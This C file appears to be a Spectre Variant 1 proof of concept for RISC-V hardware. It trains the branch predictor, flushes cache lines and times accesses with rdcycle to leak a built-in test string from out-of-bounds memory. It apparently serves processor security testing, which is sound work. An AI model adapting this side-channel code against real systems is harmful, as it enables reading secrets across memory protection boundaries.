#include <klib.h> // [1]
#include "encoding.h"
#include "cache.h"

#define TRAIN_TIMES 10 // Depends on your predictor
#define ROUNDS 1 // run the train + attack sequence X amount of times (for redundancy)
#define ATTACK_SAME_ROUNDS 5 // amount of times to attack the same index
#define SECRET_SZ 26
#define CACHE_HIT_THRESHOLD 70

uint64_t array1_sz = 16;
uint8_t unused1[64];
uint8_t array1[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];

char* secretString = "!\"#ThisIsTheBabyBoomerTest";

/**
 * reads in inArray array (and corresponding size) and outIdxArrays top two idx's (and their
 * corresponding values) in the inArray array that has the highest values.
 *
 * @input inArray array of values to find the top two maxs
 * @input inArraySize size of the inArray array in entries
 * @inout outIdxArray array holding the idxs of the top two values
 *        ([0] idx has the larger value in inArray array)
 * @inout outValArray array holding the top two values ([0] has the larger value)
 */
void topTwoIdx(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, uint64_t* outValArray){
    outValArray[0] = 0;
    outValArray[1] = 0;

    for (uint64_t i = 0; i < inArraySize; ++i){
        if (inArray[i] > outValArray[0]){
            outValArray[1] = outValArray[0];
            outValArray[0] = inArray[i];
            outIdxArray[1] = outIdxArray[0];
            outIdxArray[0] = i;
        }
        else if (inArray[i] > outValArray[1]){
            outValArray[1] = inArray[i];
            outIdxArray[1] = i;
        }
    }
}

static inline void flushCacheLine(void* addr) {
    asm volatile (
        "cbo.flush 0(%0)"
        :
        : "r"(addr)
        : "memory"
    );
}

static inline void fence() {
    asm volatile (
        "fence rw, rw"
        :
        :
        : "memory"
    );
}

/**
 * takes in an idx to use to access a secret array. this idx is used to read any mem addr outside
 * the bounds of the array through the Spectre Variant 1 attack.
 *
 * @input idx input to be used to idx the array
 */
uint8_t victimFunc(uint64_t idx){
    uint8_t volatile dummy = 2;

    // stall array1_sz by doing div operations (operation is (array1_sz << 4) / (2*4))
    array1_sz =  array1_sz << 4;
    asm("fcvt.s.lu	fa4, %[in]\n"
        "fcvt.s.lu	fa5, %[inout]\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fcvt.lu.s	%[out], fa5, rtz\n"
        : [out] "=r" (array1_sz)
        : [inout] "r" (array1_sz), [in] "r" (dummy)
        : "fa4", "fa5");

    if (idx < array1_sz){
        dummy = array2[array1[idx] * L1_BLOCK_SZ_BYTES];
    }

    // bound speculation here just in case it goes over
    dummy = rdcycle();  
	return dummy; //Not used
}

int main(void){
    uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);
	uint64_t start, end, diff, passInIdx, randIdx;
    uint8_t volatile dummy = 0;
    static uint64_t results[256];

    // try to read out the secret
    for(uint64_t len = 0; len < SECRET_SZ; ++len){

        // clear results every round
        for(uint64_t cIdx = 0; cIdx < 256; ++cIdx){
            results[cIdx] = 0;
        }

        // run the attack on the same idx ATTACK_SAME_ROUNDS times
        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){
			//printf("attack round %d\n", atkRound);

            // make sure array you read from is not in the cache by using DIY flushCache or CacheManagementOperations through flushCacheLine
            //flushCache((uint64_t)array2, sizeof(array2));
			for (uint64_t i = 0; i < 256; ++i){
				flushCacheLine(&array2[i * L1_BLOCK_SZ_BYTES]);
			}

            for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j){
                // bit twiddling to set passInIdx=randIdx or to attackIdx after TRAIN_TIMES iterations
                // avoid jumps in case those tip off the branch predictor
                // note: randIdx changes everytime the atkRound changes so that the tally does not get affected
                //       training creates a false hit in array2 for that array1 value (you want this to be ignored by having it changed)
                randIdx = atkRound % array1_sz;
                passInIdx = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; // after every TRAIN_TIMES set passInIdx=...FFFF0000 else 0
                passInIdx = (passInIdx | (passInIdx >> 16)); // set the passInIdx=-1 or 0
                passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select randIdx or attackIdx 

                // set of constant takens to make the BHR be in a all taken state
                for(uint64_t k = 0; k < 30; ++k){
                    asm("");
                }

                // call function to train or attack
                victimFunc(passInIdx);
            }
            
            // read out array 2 and see the hit secret value
            // this is also assuming there is no prefetching
            for (uint64_t i = 0; i < 256; ++i){
				fence(); // fence to correctly read CSR register as can be executed OoO
                start = rdcycle();
				
                dummy &= array2[i * L1_BLOCK_SZ_BYTES];
				
				fence();
				end = rdcycle();
				
                diff = end - start;
				//printf("diff %d\n", diff);
                if ( diff < CACHE_HIT_THRESHOLD ){
                    results[i] += 1;
                }
            }
			//printf("diff %d, %lu\n", diff, start);
        }
        
        // get highest and second highest result hit values
        uint8_t output[2];
        uint64_t hitArray[2];
        topTwoIdx(results, 256, output, hitArray);

        printf("m[0x%p] = want(%c) =?= guess(hits,char) 1.(%lu, %c) 2.(%lu, %c)\n", (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], hitArray[1], output[1]); 
        //printf("want(%c) =?= guess 1.(%c) 2.(%c)\n", secretString[len], output[0], output[1]); 

        // read in the next secret 
        ++attackIdx;
    }

    return 0;
}